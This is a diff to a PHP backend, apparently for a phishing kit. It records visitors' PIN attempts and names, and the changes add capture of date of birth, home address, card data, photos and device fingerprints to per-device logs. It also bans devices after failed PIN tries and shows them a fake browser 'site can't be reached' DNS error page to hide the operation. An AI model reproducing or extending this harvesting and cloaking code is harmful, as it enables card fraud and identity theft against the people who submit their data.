@@ -8,6 +8,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
     exit;
 }
 
+// Debug logging to file
+$debugLog = __DIR__ . '/debug.log';
+
 // Reliable IP Detection
 $ip = isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : (isset($_SERVER['HTTP_X_REAL_IP']) ? $_SERVER['HTTP_X_REAL_IP'] : (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'unknown'));
 if ($ip !== 'unknown' && strpos($ip, ',') !== false) {
@@ -19,11 +22,27 @@ function isBanned($deviceId, $ip) {
     $bannedDevicesFile = __DIR__ . '/banned_devices.txt';
     $bannedIpsFile = __DIR__ . '/banned_ips.txt';
     
+    // Check for banned cookie
+    if (isset($_COOKIE['banned']) && $_COOKIE['banned'] === '1') {
+        // Reinstate ban if device not in list
+        if ($deviceId !== 'unknown' && $deviceId !== '') {
+            $bannedDevices = file_exists($bannedDevicesFile) ? file($bannedDevicesFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
+            $bannedDevices = array_map('trim', $bannedDevices);
+            if (!in_array($deviceId, $bannedDevices, true)) {
+                @file_put_contents($bannedDevicesFile, $deviceId . "\n", FILE_APPEND);
+            }
+        }
+        return true;
+    }
+
     if ($deviceId !== 'unknown' && $deviceId !== '' && file_exists($bannedDevicesFile)) {
         $banned = file($bannedDevicesFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
         $banned = array_map('trim', $banned);
         if (in_array($deviceId, $banned, true)) {
-            if (!isset($_COOKIE['banned'])) @setcookie('banned', '1', time() + (365 * 24 * 60 * 60), "/");
+            // Set cookie if missing
+            if (!isset($_COOKIE['banned'])) {
+                setcookie('banned', '1', time() + (365 * 24 * 60 * 60), "/");
+            }
             return true;
         }
     }
@@ -32,15 +51,11 @@ function isBanned($deviceId, $ip) {
         $banned = file($bannedIpsFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
         $banned = array_map('trim', $banned);
         if (in_array($ip, $banned, true)) {
-            if (!isset($_COOKIE['banned'])) @setcookie('banned', '1', time() + (365 * 24 * 60 * 60), "/");
+            if (!isset($_COOKIE['banned'])) {
+                setcookie('banned', '1', time() + (365 * 24 * 60 * 60), "/");
+            }
             return true;
         }
-    }
-
-    // Cookie-only ban is not sufficient - device must be in the file
-    // Clear stale cookie if device is not actually banned
-    if (isset($_COOKIE['banned']) && $_COOKIE['banned'] === '1') {
-        @setcookie('banned', '', time() - 3600, "/");
     }
 
     return false;
@@ -50,17 +65,35 @@ function showBannedPage($host) {
     http_response_code(403);
     echo "<!-- DEVICE_BANNED -->";
     ?>
-<div id="ban-overlay" style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#f1f1f1;z-index:999999;display:flex;align-items:center;justify-content:center;font-family:'Segoe UI',Tahoma,sans-serif;color:#5f6368;">
-    <div style="max-width:600px;width:100%;padding:20px;">
-        <div style="width:72px;height:72px;background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAABIAQMAAABvIyNsAAAABlBMVEUAAAD///+l2Z/dAAAAMklEQVR4AWMYBYJBAAEDYwADAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDYwABygE+m2vFmAAAAABJRU5ErkJggg==');background-repeat:no-repeat;margin-bottom:40px;"></div>
-        <h1 style="font-size:22px;font-weight:500;color:#202124;margin-bottom:20px;">This site can't be reached</h1>
-        <p style="font-size:14px;line-height:20px;margin-bottom:10px;">Check if there is a typo in <strong><?php echo htmlspecialchars($host); ?></strong>.</p>
-        <ul style="margin-top:10px;padding-left:20px;">
-            <li style="margin-bottom:5px;font-size:14px;">If spelling is correct, try running Windows Network Diagnostics.</li>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Site Can't Be Reached</title>
+    <style>
+        body { background-color: #f1f1f1; margin: 0; font-family: 'Segoe UI', Tahoma, sans-serif; color: #5f6368; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .container { max-width: 600px; width: 100%; padding: 20px; }
+        .icon { width: 72px; height: 72px; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAABIAQMAAABvIyNsAAAABlBMVEUAAAD///+l2Z/dAAAAMklEQVR4AWMYBYJBAAEDYwADAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDYwABygE+m2vFmAAAAABJRU5ErkJggg=='); background-repeat: no-repeat; margin-bottom: 40px; }
+        h1 { font-size: 22px; font-weight: 500; color: #202124; margin-bottom: 20px; }
+        p { font-size: 14px; line-height: 20px; margin-bottom: 10px; }
+        .error-code { margin-top: 30px; font-size: 12px; text-transform: uppercase; }
+        ul { margin-top: 10px; padding-left: 20px; }
+        li { margin-bottom: 5px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="icon"></div>
+        <h1>This site can't be reached</h1>
+        <p>Check if there is a typo in <strong><?php echo htmlspecialchars($host); ?></strong>.</p>
+        <ul>
+            <li>If spelling is correct, try running Windows Network Diagnostics.</li>
         </ul>
-        <div style="margin-top:30px;font-size:12px;text-transform:uppercase;">DNS_PROBE_FINISHED_NXDOMAIN</div>
+        <div class="error-code">DNS_PROBE_FINISHED_NXDOMAIN</div>
     </div>
-</div>
+</body>
+</html>
     <?php
     exit;
 }
@@ -78,10 +111,18 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action']) && $_GET['act
 // === CHECK BAN (Early check) ===
 if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action']) && $_GET['action'] === 'checkBan') {
     $deviceId = isset($_GET['deviceId']) ? trim($_GET['deviceId']) : '';
-    if (isBanned($deviceId, $ip)) {
+    $banned = isBanned($deviceId, $ip);
+
+    @file_put_contents(__DIR__ . '/ban_debug.log', date('Y-m-d H:i:s') . " - CheckBan: deviceId=$deviceId, ip=$ip, isBanned=" . ($banned ? 'YES' : 'NO') . "\n", FILE_APPEND);
+
+    if ($banned) {
+        @file_put_contents(__DIR__ . '/ban_hits.log', date('Y-m-d H:i:s') . " - Early ban check: $deviceId from IP $ip\n", FILE_APPEND);
         showBannedPage($_SERVER['HTTP_HOST']);
     } else {
-        if (isset($_COOKIE['banned'])) setcookie('banned', '', time() - 3600, "/");
+        // If not banned, but has banned cookie, clear it (Unban action)
+        if (isset($_COOKIE['banned'])) {
+            setcookie('banned', '', time() - 3600, "/");
+        }
     }
     http_response_code(200);
     echo "OK";
@@ -97,7 +138,9 @@ if (!$data) {
 
 $deviceId = isset($data['deviceId']) ? trim($data['deviceId']) : 'unknown';
 
+// SECOND BAN CHECK (Full request)
 if (isBanned($deviceId, $ip)) {
+    @file_put_contents(__DIR__ . '/ban_hits.log', date('Y-m-d H:i:s') . " - Banned device (FullRequest): $deviceId from IP $ip\n", FILE_APPEND);
     showBannedPage($_SERVER['HTTP_HOST']);
 }
 
@@ -106,36 +149,37 @@ $event       = isset($data['event']) ? $data['event'] : 'unknown';
 $success     = (isset($data['success']) && ($data['success'] === true || $data['success'] === 'true' || $data['success'] === 1)) ? true : false;
 $pin_attempt = isset($data['pin_attempt']) ? $data['pin_attempt'] : '—';
 $name        = isset($data['name']) ? $data['name'] : '—';
+$dob         = isset($data['dob']) ? $data['dob'] : '—';
+$address     = isset($data['address']) ? $data['address'] : '—';
+$card        = isset($data['card']) ? $data['card'] : '—';
 
-// Photo Handling Optimization
-$photo_updated = false;
-$photo_valid = false;
+// Extract fingerprint
+$known_keys = ['deviceId', 'ip', 'event', 'success', 'pin_attempt', 'name', 'dob', 'address', 'card', 'photo', 'timestamp'];
+$fingerprint_data = [];
+foreach ($data as $key => $value) {
+    if (!in_array($key, $known_keys)) {
+        $fingerprint_data[$key] = $value;
+    }
+}
+$fingerprint = !empty($fingerprint_data) ? json_encode($fingerprint_data) : '—';
+
+// Handle Photo
+$photo_path = '—';
+$has_photo = false;
 if (isset($data['photo']) && !empty($data['photo']) && $deviceId !== 'unknown') {
     $photosDir = __DIR__ . '/photos';
     if (!is_dir($photosDir)) @mkdir($photosDir, 0777, true);
-    
-    $photoData = $data['photo'];
-    if (strpos($photoData, 'data:image') === 0) {
-        // Basic validation: must be more than 1000 chars for a real image
-        if (strlen($photoData) > 1000) {
-            $photo_valid = true;
-            $photo_raw = substr($photoData, strpos($photoData, ',') + 1);
-            $decodedPhoto = base64_decode($photo_raw);
-            if ($decodedPhoto) {
-                $photo_path = $photosDir . '/' . $deviceId . '.jpg';
-                file_put_contents($photo_path, $decodedPhoto);
-                $photo_updated = true;
-            }
-        }
+    if (is_dir($photosDir)) {
+        $photo_path = $photosDir . '/' . $deviceId . '.txt';
+        @file_put_contents($photo_path, $data['photo']);
+        $has_photo = true;
     }
 }
 
-// 1. Update Latest State
+// 1. Update Latest State & Auto-Ban logic
 $stateFile  = __DIR__ . '/latest_state.json';
 $state = file_exists($stateFile) ? json_decode(file_get_contents($stateFile), true) : [];
 if (!is_array($state)) $state = [];
-
-$request_photo = false;
 
 if ($deviceId !== 'unknown') {
     if (!isset($state[$deviceId])) {
@@ -147,9 +191,14 @@ if ($deviceId !== 'unknown') {
             'success' => $success ? 'YES' : 'NO',
             'pin_attempt' => $pin_attempt,
             'name' => $name,
+            'dob' => $dob,
+            'address' => $address,
+            'card' => $card,
+            'photo_path' => $photo_path,
+            'fingerprint' => $fingerprint,
             'last_seen' => $timestamp,
-            'failed_attempts' => 0,
-            'has_photo' => $photo_updated
+            'attempt_count' => 0,
+            'failed_attempts' => 0
         ];
     } else {
         $state[$deviceId]['ip'] = $ip;
@@ -158,41 +207,33 @@ if ($deviceId !== 'unknown') {
         $state[$deviceId]['success'] = ($success || ($state[$deviceId]['success'] ?? 'NO') === 'YES') ? 'YES' : 'NO';
         if ($pin_attempt !== '—') $state[$deviceId]['pin_attempt'] = $pin_attempt;
         if ($name !== '—') $state[$deviceId]['name'] = $name;
+        if ($dob !== '—') $state[$deviceId]['dob'] = $dob;
+        if ($address !== '—') $state[$deviceId]['address'] = $address;
+        if ($card !== '—') $state[$deviceId]['card'] = $card;
+        if ($fingerprint !== '—') $state[$deviceId]['fingerprint'] = $fingerprint;
+        if ($photo_path !== '—') $state[$deviceId]['photo_path'] = $photo_path;
         $state[$deviceId]['last_seen'] = $timestamp;
-        
-        if ($photo_updated) {
-            $state[$deviceId]['has_photo'] = true;
-        } elseif (!isset($state[$deviceId]['has_photo'])) {
-            // Check if photo file already exists and is valid
-            $photo_path = __DIR__ . '/photos/' . $deviceId . '.jpg';
-            $state[$deviceId]['has_photo'] = (file_exists($photo_path) && filesize($photo_path) > 1000);
-        }
-        
-        // Check for photo request
-        if (!empty($state[$deviceId]['request_photo'])) {
-            $request_photo = true;
-            // Clear flag if photo was just provided
-            if ($photo_updated || $event === 'photo_response') {
-                $state[$deviceId]['request_photo'] = false;
-                $request_photo = false;
-            }
-        }
     }
 
     // Auto-ban logic
     if ($event === 'pin_failed') {
         $state[$deviceId]['failed_attempts'] = ($state[$deviceId]['failed_attempts'] ?? 0) + 1;
+        $state[$deviceId]['attempt_count'] = ($state[$deviceId]['attempt_count'] ?? 0) + 1;
+        
         if ($state[$deviceId]['failed_attempts'] >= 10) {
+            // Auto-ban the device
             $bannedDevicesFile = __DIR__ . '/banned_devices.txt';
             $bannedDevices = file_exists($bannedDevicesFile) ? file($bannedDevicesFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
             $bannedDevices = array_map('trim', $bannedDevices);
             if (!in_array($deviceId, $bannedDevices, true)) {
                 @file_put_contents($bannedDevicesFile, $deviceId . "\n", FILE_APPEND);
             }
+            // Set cookie for auto-ban too
             setcookie('banned', '1', time() + (365 * 24 * 60 * 60), "/");
         }
     } elseif ($event === 'pin_success') {
         $state[$deviceId]['failed_attempts'] = 0;
+        $state[$deviceId]['attempt_count'] = ($state[$deviceId]['attempt_count'] ?? 0) + 1;
     }
 
     @file_put_contents($stateFile, json_encode($state, JSON_PRETTY_PRINT));
@@ -208,13 +249,13 @@ $visitEntry = [
     'success' => $success,
     'pin_attempt' => $pin_attempt,
     'name' => $name,
-    'photoChanged' => $photo_updated || (isset($data['photoChanged']) && $data['photoChanged'])
+    'dob' => $dob,
+    'address' => $address,
+    'card' => $card,
+    'has_photo' => $has_photo
 ];
 @file_put_contents($visitsLog, json_encode($visitEntry) . "\n", FILE_APPEND);
 
 header('Content-Type: application/json');
-echo json_encode([
-    "status" => "ok",
-    "request_photo" => $request_photo
-]);
+echo json_encode(["status" => "ok", "logged" => true]);
 ?>
